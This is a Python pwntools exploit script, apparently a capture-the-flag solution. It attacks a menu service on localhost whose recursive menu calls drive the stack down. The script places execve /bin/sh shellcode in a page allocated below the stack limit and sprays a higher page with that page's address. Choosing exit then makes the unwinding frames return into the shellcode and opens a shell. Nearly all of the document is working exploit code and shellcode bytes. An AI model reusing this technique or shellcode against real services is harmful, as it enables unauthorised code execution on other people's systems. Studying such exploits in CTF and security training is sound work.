#!/usr/bin/python

'''
select_menu() is called recursively so after each menu choice $esp is decremented by 0x430.

Lower limit for stact addr is 0xff7fe000, once $esp is smaller - SIGSEGV is raised.

First We've to allocate page below the stack limit to place shellcode in it.
(Just to make sure that growing stack does not destroy shellocde).

Now We need to allocate page with higher address than current $esp and
spray this whole page with address to page with shellcode.
If We're unlucky, $esp will reach stack limit before We hit proper address.

Final step is to choose 'exit' menu. Nested select_menu() stack frames will 
start to unwind and and at some point return addr from out page will be used.
'''

from pwn import *
context.log_level = 'info'

def dec_stack():
    global curr_stack
    curr_stack -= frame_size

def free_page(page_no):
    dec_stack()
    t.sendline('4')
    t.sendline(str(page_no))

def alloc_page():
    dec_stack()
    t.sendline('1')
    _ = t.readuntil(' [')
    ptr = t.readuntil(']')[:-1]
    return int(ptr, 16)

def write_page(page_no, what):
    dec_stack()
    t.sendline('2')
    t.sendline(str(page_no))
    t.sendline(what)


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89" \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

stack_limit = 0xff7fe000
curr_stack  = 0xffffd820
frame_size  = 0x430
page_size   = 0x1000

shellcode_page_no   = 0
shellcode_page      = 0xffffffff

ret_addr_page_no    = 1
ret_addr_page       = 0xffffffff


t = remote('localhost', 9019)

while True:
    ptr = alloc_page() # shellcode_page_no
    if ptr < stack_limit:
        shellcode_page = ptr
        write_page(shellcode_page_no, shellcode)
        print 'shellcode on page: {:x}'.format(shellcode_page)
        break
    free_page(shellcode_page_no)

while True:
    ptr = alloc_page() # ret_addr_page_no
    print 'allocated: {:x}, stack somewhere around: {:x}'.format(ptr, curr_stack)
    if ptr > curr_stack:
        ret_addr_page = ptr
        print 'going to spray page: {:x}'.format(ret_addr_page)
        write_page(ret_addr_page_no, p32(shellcode_page) * ((page_size / 4) - 1))
        break
    free_page(ret_addr_page_no)

print "let's go"
t.sendline('5')
t.interactive()
